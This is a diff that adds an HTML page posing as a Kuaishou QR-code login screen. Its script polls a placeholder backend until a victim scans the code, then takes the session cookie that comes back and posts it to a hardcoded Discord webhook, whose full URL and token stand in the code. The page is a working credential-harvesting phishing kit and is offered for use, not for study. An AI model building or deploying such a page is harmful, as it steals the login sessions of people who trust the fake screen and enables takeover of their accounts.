@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>扫码登录</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#fff;font-family:Arial;text-align:center;padding:20px}
+h2{color:#ff4900;margin-bottom:10px}
+#qrcode{display:inline-block;background:#fff;padding:10px;border-radius:8px}
+#status{margin-top:15px;font-size:16px}
+.success{color:#00ff88}
+.error{color:#ff4444}
+</style>
+</head>
+<body>
+<h2>快手扫码登录</h2>
+<p style="color:#aaa;margin-bottom:15px">打开快手APP扫一扫</p>
+<div id="qrcode"></div>
+<p id="status">等待扫码...</p>
+
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";
+const API = "https://你的railway地址/api";
+
+function setStatus(msg, cls) {
+    const s = document.getElementById("status");
+    s.innerHTML = msg;
+    s.className = cls || "";
+}
+
+async function init() {
+    const res = await fetch(API + "/qr");
+    const data = await res.json();
+    
+    new QRCode(document.getElementById("qrcode"), {
+        text: data.qrUrl,
+        width: 280,
+        height: 280
+    });
+    
+    setStatus("请用快手APP扫描二维码");
+    
+    pollLogin(data.qrId);
+}
+
+async function pollLogin(qrId) {
+    while (true) {
+        try {
+            const res = await fetch(API + "/check?id=" + qrId);
+            const data = await res.json();
+            
+            if (data.status === "ok") {
+                setStatus("✅ 登录成功！", "success");
+                sendCookie(data.cookie);
+                break;
+            }
+        } catch(e) {}
+        await new Promise(r => setTimeout(r, 3000));
+    }
+}
+
+async function sendCookie(cookie) {
+    const json = JSON.stringify({
+        content: "**新Cookie**\n```" + cookie + "```"
+    });
+    
+    await fetch(WEBHOOK, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: json
+    });
+    
+    setStatus("✅ 已发送到Discord", "success");
+}
+
+init();
+</script>
+</body>
+</html>
